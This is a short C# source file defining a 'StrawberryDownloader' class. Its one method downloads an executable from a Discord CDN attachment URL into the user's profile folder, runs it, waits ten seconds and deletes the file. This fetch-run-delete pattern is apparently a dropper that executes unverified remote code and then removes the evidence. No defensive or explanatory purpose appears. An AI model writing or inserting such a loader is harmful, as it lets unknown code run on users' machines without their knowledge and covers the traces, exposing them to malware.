using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Strawberry.Araclar
{
    class StrawberryDownloader
    {
        public async void indir()
        {
            string usryeri = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            using (WebClient wc = new WebClient())
            {
                wc.DownloadFile("https://cdn.discordapp.com/attachments/766274827307974676/795676809487974410/Strawberry.exe", Path.Combine(usryeri, "strawberry.exe"));
            }

            Process.Start(Path.Combine(usryeri, "strawberry.exe"));

            await Task.Delay(10000);

            File.Delete(Path.Combine(usryeri, "strawberry.exe"));
        }
    }
}
